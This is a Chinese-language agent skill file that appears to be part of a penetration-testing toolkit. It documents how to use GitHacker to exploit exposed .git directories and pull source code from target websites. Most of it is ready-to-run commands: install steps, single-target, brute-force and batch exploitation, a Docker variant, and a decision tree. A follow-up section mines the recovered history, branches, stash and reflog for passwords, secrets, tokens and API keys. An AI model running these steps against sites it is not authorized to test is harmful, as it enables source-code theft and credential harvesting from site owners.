---
name: githacker-git-leak
description: "使用 GitHacker 利用 .git 目录泄露漏洞恢复目标源码。GitHacker 是多线程 .git 泄露利用工具，相比 git-dumper/GitHack 能恢复更完整的内容——包括 stash、所有分支、标签、reflog。即使目标禁用了目录列表（403），也能通过暴力枚举恢复分支和标签。当目标 /.git/HEAD 或 /.git/config 返回 200、目录列表中发现 .git/ 目录、或侦察阶段发现版本控制相关文件时使用此技能。恢复源码后可查找硬编码凭据、API Key、数据库连接串"
metadata:
  tags: "githacker,git,leak,泄露,源码,source-code,dump,recovery,web,信息泄露,.git,.git/HEAD,.git/config,git目录,版本控制,git-dumper,git-hack,源码恢复,提交历史,代码泄露"
  category: "tool"
---

# GitHacker .git 泄露利用

GitHacker 专注于 .git 目录泄露的**完整恢复**——不仅拿到源码，还能恢复 stash、所有分支/标签、reflog。开发者删过的密码和调试代码往往藏在这些地方。

项目地址：https://github.com/WangYihang/GitHacker

## 安装

```bash
pip install GitHacker
# 或
f8x -install githacker
```

## 基本用法

```bash
# 快速利用
githacker --url http://target/.git/ --output-folder result

# 暴力枚举分支/标签名（目标关闭目录列表时必须开启）
githacker --brute --url http://target/.git/ --output-folder result

# 批量目标（每行一个 URL）
githacker --brute --url-file websites.txt --output-folder result
```

## Docker 用法（推荐）

远程 .git 目录可能被植入恶意内容（如 hooks 脚本），在 Docker 中运行更安全：

```bash
docker run -v $(pwd)/results:/tmp/githacker/results \
  wangyihang/githacker \
  --brute --output-folder /tmp/githacker/results \
  --url http://target/.git/
```

## 恢复后审计流程

GitHacker 恢复的目录是一个完整的 git 仓库，可以直接用 git 命令审计：

```bash
cd result/target/

# 1. 查看提交历史（重点找被删除的敏感信息）
git log --oneline --all
git log -p --all -S "password"
git log -p --all -S "secret"
git log -p --all -S "flag"

# 2. 查看所有分支（开发/测试分支常有敏感信息）
git branch -a
git checkout dev       # 切到开发分支看看

# 3. 查看 stash（开发者暂存的修改）
git stash list
git stash show -p stash@{0}

# 4. 查看 reflog（找到被 reset 掉的提交）
git reflog
git show <commit-hash>

# 5. 搜索凭据
grep -rn "password\|secret\|token\|api_key\|flag{" .
```

## 与其他工具对比

| 能力 | GitHacker | git-dumper | GitHack |
|------|-----------|------------|---------|
| 源码恢复 | ✅ | ✅ | ✅ |
| Stash 恢复 | ✅ | ✅ | ❌ |
| 所有分支 | ✅（暴力枚举） | ❌ | ❌ |
| 所有标签 | ✅（暴力枚举） | ❌ | ❌ |
| Reflog | ✅ | ✅ | ❌ |
| 无目录列表 | ✅ | ✅ | ✅ |

git-dumper 适合快速拿源码；GitHacker 的 `--brute` 模式能覆盖更多分支和标签，适合深度审计。

## 决策树

```
发现 /.git/HEAD 返回 200？
├─ 目录列表开启（200）→ githacker 直接利用
├─ 目录列表关闭（403）→ githacker --brute（暴力枚举分支/标签）
├─ 需要快速拿源码 → git-dumper 也行
└─ 多个目标批量扫 → githacker --url-file websites.txt
```
